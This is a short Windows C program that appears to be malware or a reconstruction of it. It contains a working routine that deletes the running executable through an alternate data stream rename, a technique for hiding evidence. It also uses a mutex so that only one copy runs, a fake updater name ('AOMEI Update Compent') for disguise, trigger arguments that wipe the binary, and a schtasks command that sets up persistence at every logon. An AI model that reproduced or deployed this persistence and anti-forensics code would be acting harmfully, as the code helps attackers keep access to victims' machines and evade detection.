#include <windows.h>
#include <stdio.h>

#define STREAM_NAME L":wtfbbq"

BOOL SelfDeleteADS(void) {
    WCHAR szPath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, szPath, MAX_PATH))
        return FALSE;

    HANDLE hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    FILE_RENAME_INFO renameInfo = {0};
    renameInfo.FileNameLength = sizeof(STREAM_NAME) - sizeof(WCHAR);
    memcpy(renameInfo.FileName, STREAM_NAME, sizeof(STREAM_NAME));

    if (!SetFileInformationByHandle(hFile, FileRenameInfo, &renameInfo, sizeof(renameInfo))) {
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);

    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    FILE_DISPOSITION_INFO dispInfo = {0};
    dispInfo.DeleteFile = TRUE;
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &dispInfo, sizeof(dispInfo))) {
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);
    return TRUE;
}

int main(int argc, char* argv[]) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"Global\\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }

    const char* typo = "AOMEI Update Compent";

    if (argc > 1) {
        if (strcmp(argv[1], "--nitrod") == 0 || strcmp(argv[1], "NITRODP") == 0 || strcmp(argv[1], "NITRODT") == 0) {
            SelfDeleteADS();
            return 0;
        }
        if (strcmp(argv[1], "--runtimechk") == 0) {
            // Task check
        }
    }

    system("schtasks /create /tn \"RadminComponentRuntime\" /tr \"upgrade-now.exe --runtimechk\" /sc onlogon /f");

    return 0;
}
